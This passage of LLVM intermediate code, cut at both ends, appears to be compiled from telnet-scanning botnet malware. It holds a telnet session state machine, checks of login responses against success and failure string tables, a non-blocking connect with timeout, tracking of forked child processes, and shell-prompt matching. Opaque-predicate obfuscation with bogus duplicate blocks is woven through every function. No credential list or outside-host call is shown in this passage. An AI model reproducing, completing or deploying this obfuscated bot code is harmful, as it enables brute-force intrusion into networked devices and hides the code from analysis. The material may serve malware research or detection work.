  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load i32, i32* @x.53
  %14 = load i32, i32* @y.54
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %22 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %21, i32 0, i32 7
  store i32 0, i32* %22, align 8
  %23 = load i32, i32* %4, align 4
  %24 = trunc i32 %23 to i8
  %25 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %26 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %25, i32 0, i32 2
  store i8 %24, i8* %26, align 8
  %27 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %28 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i32 0, i32 9
  %29 = load i8*, i8** %28, align 8
  call void @llvm.memset.p0i8.i64(i8* %29, i8 0, i64 1024, i32 1, i1 false)
  %30 = load i32, i32* @x.53
  %31 = load i32, i32* @y.54
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %12
  %38 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %38, i32 0, i32 7
  store i32 0, i32* %39, align 8
  %40 = load i32, i32* %4, align 4
  %41 = trunc i32 %40 to i8
  %42 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %43 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i32 0, i32 2
  store i8 %41, i8* %43, align 8
  %44 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 9
  %46 = load i8*, i8** %45, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = load i32, i32* @x.57
  %3 = load i32, i32* @y.58
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 @contains_string(i8* %11, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @successes, i32 0, i32 0))
  %13 = load i32, i32* @x.57
  %14 = load i32, i32* @y.58
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %12

originalBBalteredBB:                              ; preds = %originalBB, %1
  %21 = alloca i8*, align 8
  store i8* %0, i8** %21, align 8
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @contains_string(i8* %22, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @successes, i32 0, i32 0))
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([9 x i8*], [9 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %20 = load i32, i32* %6, align 4
  %21 = call i32 (i32, i32, ...) @fcntl(i32 %20, i32 3, i8* null)
  %22 = sext i32 %21 to i64
  store i64 %22, i64* %15, align 8
  %23 = load i64, i64* %15, align 8
  %24 = or i64 %23, 2048
  store i64 %24, i64* %15, align 8
  %25 = load i32, i32* %6, align 4
  %26 = load i64, i64* %15, align 8
  %27 = call i32 (i32, i32, ...) @fcntl(i32 %25, i32 4, i64 %26)
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = trunc i32 %29 to i16
  %31 = call zeroext i16 @htons(i16 zeroext %30) #13
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %31, i16* %32, align 2
  %33 = load i8*, i8** %7, align 8
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %35 = call i32 @getHost(i8* %33, %struct.in_addr* %34)
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %168

; <label>:38:                                     ; preds = %4
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %43 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  store %struct.sockaddr* %43, %struct.sockaddr** %42, align 8
  %44 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %45 = load %struct.sockaddr*, %struct.sockaddr** %44, align 8
  %46 = call i32 @connect(i32 %41, %struct.sockaddr* %45, i32 16)
  store i32 %46, i32* %16, align 4
  %47 = load i32, i32* %16, align 4
  %48 = icmp slt i32 %47, 0
  br i1 %48, label %49, label %159

; <label>:49:                                     ; preds = %38
  %50 = call i32* @__errno_location() #13
  %51 = load i32, i32* %50, align 4
  %52 = icmp eq i32 %51, 115
  br i1 %52, label %53, label %157

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* @x.63
  %55 = load i32, i32* @y.64
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %53
  %62 = load i32, i32* %9, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %63, i64* %64, align 8
  %65 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %65, align 8
  %66 = load i32, i32* @x.63
  %67 = load i32, i32* @y.64
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %74

; <label>:74:                                     ; preds = %originalBBpart2
  %75 = load i32, i32* @x.63
  %76 = load i32, i32* @y.64
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %74
  %83 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %84 = getelementptr inbounds [16 x i64], [16 x i64]* %83, i64 0, i64 0
  %85 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %84) #2, !srcloc !4
  %86 = extractvalue { i64, i64* } %85, 0
  %87 = extractvalue { i64, i64* } %85, 1
  %88 = trunc i64 %86 to i32
  store i32 %88, i32* %18, align 4
  %89 = ptrtoint i64* %87 to i64
  %90 = trunc i64 %89 to i32
  store i32 %90, i32* %19, align 4
  %91 = load i32, i32* @x.63
  %92 = load i32, i32* @y.64
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %99

; <label>:99:                                     ; preds = %originalBBpart24
  %100 = load i32, i32* %6, align 4
  %101 = srem i32 %100, 64
  %102 = zext i32 %101 to i64
  %103 = shl i64 1, %102
  %104 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %105 = load i32, i32* %6, align 4
  %106 = sdiv i32 %105, 64
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds [16 x i64], [16 x i64]* %104, i64 0, i64 %107
  %109 = load i64, i64* %108, align 8
  %110 = or i64 %109, %103
  store i64 %110, i64* %108, align 8
  %111 = load i32, i32* %6, align 4
  %112 = add nsw i32 %111, 1
  %113 = call i32 @select(i32 %112, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %114 = icmp sgt i32 %113, 0
  br i1 %114, label %115, label %139

; <label>:115:                                    ; preds = %99
  store i32 4, i32* %13, align 4
  %116 = load i32, i32* %6, align 4
  %117 = bitcast i32* %14 to i8*
  %118 = call i32 @getsockopt(i32 %116, i32 1, i32 4, i8* %117, i32* %13) #2
  %119 = load i32, i32* %14, align 4
  %120 = icmp ne i32 %119, 0
  br i1 %120, label %121, label %122

; <label>:121:                                    ; preds = %115
  store i32 0, i32* %5, align 4
  br label %168

; <label>:122:                                    ; preds = %115
  %123 = load i32, i32* @x.63
  %124 = load i32, i32* @y.64
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %122
  %131 = load i32, i32* @x.63
  %132 = load i32, i32* @y.64
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %156

; <label>:139:                                    ; preds = %99
  %140 = load i32, i32* @x.63
  %141 = load i32, i32* @y.64
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %139
  store i32 0, i32* %5, align 4
  %148 = load i32, i32* @x.63
  %149 = load i32, i32* @y.64
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %168

; <label>:156:                                    ; preds = %originalBBpart28
  br label %158

; <label>:157:                                    ; preds = %49
  store i32 0, i32* %5, align 4
  br label %168

; <label>:158:                                    ; preds = %156
  br label %159

; <label>:159:                                    ; preds = %158, %38
  %160 = load i32, i32* %6, align 4
  %161 = call i32 (i32, i32, ...) @fcntl(i32 %160, i32 3, i8* null)
  %162 = sext i32 %161 to i64
  store i64 %162, i64* %15, align 8
  %163 = load i64, i64* %15, align 8
  %164 = and i64 %163, -2049
  store i64 %164, i64* %15, align 8
  %165 = load i32, i32* %6, align 4
  %166 = load i64, i64* %15, align 8
  %167 = call i32 (i32, i32, ...) @fcntl(i32 %165, i32 4, i64 %166)
  store i32 1, i32* %5, align 4
  br label %168

; <label>:168:                                    ; preds = %159, %157, %originalBBpart212, %121, %37
  %169 = load i32, i32* @x.63
  %170 = load i32, i32* @y.64
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %168
  %177 = load i32, i32* %5, align 4
  %178 = load i32, i32* @x.63
  %179 = load i32, i32* @y.64
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  ret i32 %177

originalBBalteredBB:                              ; preds = %originalBB, %53
  %186 = load i32, i32* %9, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %187, i64* %188, align 8
  %189 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %189, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %74
  %190 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %191 = getelementptr inbounds [16 x i64], [16 x i64]* %190, i64 0, i64 0
  %192 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %191) #2, !srcloc !4
  %193 = extractvalue { i64, i64* } %192, 0
  %194 = extractvalue { i64, i64* } %192, 1
  %195 = trunc i64 %193 to i32
  store i32 %195, i32* %18, align 4
  %196 = ptrtoint i64* %194 to i64
  %197 = trunc i64 %196 to i32
  store i32 %197, i32* %19, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %122
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %139
  store i32 0, i32* %5, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %168
  %198 = load i32, i32* %5, align 4
  br label %originalBB14
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp sle i32 %6, 0
  br i1 %7, label %8, label %26

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* @x.65
  %10 = load i32, i32* @y.66
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = load i32, i32* %2, align 4
  store i32 %17, i32* %1, align 4
  %18 = load i32, i32* @x.65
  %19 = load i32, i32* @y.66
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %80

; <label>:26:                                     ; preds = %0
  %27 = load i32, i32* @x.65
  %28 = load i32, i32* @y.66
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i32, i32* @numpids, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* @numpids, align 4
  %37 = load i32, i32* @numpids, align 4
  %38 = add nsw i32 %37, 1
  %39 = mul nsw i32 %38, 4
  %40 = sext i32 %39 to i64
  %41 = call noalias i8* @malloc(i64 %40) #2
  %42 = bitcast i8* %41 to i32*
  store i32* %42, i32** %3, align 8
  store i32 0, i32* %4, align 4
  %43 = load i32, i32* @x.65
  %44 = load i32, i32* @y.66
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart225, label %originalBB1alteredBB

originalBBpart225:                                ; preds = %originalBB1
  br label %51

; <label>:51:                                     ; preds = %66, %originalBBpart225
  %52 = load i32, i32* %4, align 4
  %53 = load i32, i32* @numpids, align 4
  %54 = sub nsw i32 %53, 1
  %55 = icmp slt i32 %52, %54
  br i1 %55, label %56, label %69

; <label>:56:                                     ; preds = %51
  %57 = load i32*, i32** @pids, align 8
  %58 = load i32, i32* %4, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i32, i32* %57, i64 %59
  %61 = load i32, i32* %60, align 4
  %62 = load i32*, i32** %3, align 8
  %63 = load i32, i32* %4, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i32, i32* %62, i64 %64
  store i32 %61, i32* %65, align 4
  br label %66

; <label>:66:                                     ; preds = %56
  %67 = load i32, i32* %4, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %4, align 4
  br label %51

; <label>:69:                                     ; preds = %51
  %70 = load i32, i32* %2, align 4
  %71 = load i32*, i32** %3, align 8
  %72 = load i32, i32* @numpids, align 4
  %73 = sub nsw i32 %72, 1
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i32, i32* %71, i64 %74
  store i32 %70, i32* %75, align 4
  %76 = load i32*, i32** @pids, align 8
  %77 = bitcast i32* %76 to i8*
  call void @free(i8* %77) #2
  %78 = load i32*, i32** %3, align 8
  store i32* %78, i32** @pids, align 8
  %79 = load i32, i32* %2, align 4
  store i32 %79, i32* %1, align 4
  br label %80

; <label>:80:                                     ; preds = %69, %originalBBpart2
  %81 = load i32, i32* %1, align 4
  ret i32 %81

originalBBalteredBB:                              ; preds = %originalBB, %8
  %82 = load i32, i32* %2, align 4
  store i32 %82, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %83 = load i32, i32* @numpids, align 4
  %_ = shl i32 %83, 1
  %_2 = sub i32 %83, 1
  %gen = mul i32 %_2, 1
  %_3 = sub i32 0, %83
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 0, %83
  %gen6 = add i32 %_5, 1
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* @numpids, align 4
  %85 = load i32, i32* @numpids, align 4
  %_7 = sub i32 0, %85
  %gen8 = add i32 %_7, 1
  %_9 = sub i32 %85, 1
  %gen10 = mul i32 %_9, 1
  %_11 = shl i32 %85, 1
  %_12 = sub i32 0, %85
  %gen13 = add i32 %_12, 1
  %_14 = sub i32 %85, 1
  %gen15 = mul i32 %_14, 1
  %86 = add nsw i32 %85, 1
  %_16 = sub i32 0, %86
  %gen17 = add i32 %_16, 4
  %_18 = shl i32 %86, 4
  %_19 = shl i32 %86, 4
  %_20 = shl i32 %86, 4
  %_21 = shl i32 %86, 4
  %_22 = sub i32 %86, 4
  %gen23 = mul i32 %_22, 4
  %87 = mul nsw i32 %86, 4
  %88 = sext i32 %87 to i64
  %89 = call noalias i8* @malloc(i64 %88) #2
  %90 = bitcast i8* %89 to i32*
  store i32* %90, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.310, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %145, %1
  %12 = load i32, i32* @x.67
  %13 = load i32, i32* @y.68
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %6, align 4
  %21 = sext i32 %20 to i64
  %22 = load i8*, i8** %4, align 8
  %23 = call i64 @strlen(i8* %22) #10
  %24 = icmp ult i64 %21, %23
  %25 = load i32, i32* @x.67
  %26 = load i32, i32* @y.68
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %148

; <label>:33:                                     ; preds = %originalBBpart2
  br label %34

; <label>:34:                                     ; preds = %106, %33
  %35 = load i32, i32* %5, align 4
  %36 = load i32, i32* %7, align 4
  %37 = icmp sgt i32 %35, %36
  br i1 %37, label %38, label %104

; <label>:38:                                     ; preds = %34
  %39 = load i8*, i8** %3, align 8
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = sub i64 0, %44
  %46 = getelementptr inbounds i8, i8* %42, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %86, label %50

; <label>:50:                                     ; preds = %38
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 32
  br i1 %61, label %86, label %62

; <label>:62:                                     ; preds = %50
  %63 = load i8*, i8** %3, align 8
  %64 = load i32, i32* %5, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i32, i32* %7, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 0, %68
  %70 = getelementptr inbounds i8, i8* %66, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp eq i32 %72, 13
  br i1 %73, label %86, label %74

; <label>:74:                                     ; preds = %62
  %75 = load i8*, i8** %3, align 8
  %76 = load i32, i32* %5, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i32, i32* %7, align 4
  %80 = sext i32 %79 to i64
  %81 = sub i64 0, %80
  %82 = getelementptr inbounds i8, i8* %78, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = icmp eq i32 %84, 10
  br label %86

; <label>:86:                                     ; preds = %74, %62, %50, %38
  %87 = phi i1 [ true, %62 ], [ true, %50 ], [ true, %38 ], [ %85, %74 ]
  %88 = load i32, i32* @x.67
  %89 = load i32, i32* @y.68
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %86
  %96 = load i32, i32* @x.67
  %97 = load i32, i32* @y.68
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %104

; <label>:104:                                    ; preds = %originalBBpart24, %34
  %105 = phi i1 [ false, %34 ], [ %87, %originalBBpart24 ]
  br i1 %105, label %106, label %109

; <label>:106:                                    ; preds = %104
  %107 = load i32, i32* %7, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %7, align 4
  br label %34

; <label>:109:                                    ; preds = %104
  %110 = load i32, i32* @x.67
  %111 = load i32, i32* @y.68
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %109
  %118 = load i8*, i8** %3, align 8
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = load i32, i32* %7, align 4
  %123 = sext i32 %122 to i64
  %124 = sub i64 0, %123
  %125 = getelementptr inbounds i8, i8* %121, i64 %124
  %126 = load i8, i8* %125, align 1
  %127 = sext i8 %126 to i32
  %128 = load i8*, i8** %4, align 8
  %129 = load i32, i32* %6, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = icmp eq i32 %127, %133
  %135 = load i32, i32* @x.67
  %136 = load i32, i32* @y.68
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart214, label %originalBB6alteredBB

originalBBpart214:                                ; preds = %originalBB6
  br i1 %134, label %143, label %144

; <label>:143:                                    ; preds = %originalBBpart214
  store i32 1, i32* %2, align 4
  br label %149

; <label>:144:                                    ; preds = %originalBBpart214
  br label %145

; <label>:145:                                    ; preds = %144
  %146 = load i32, i32* %6, align 4
  %147 = add nsw i32 %146, 1
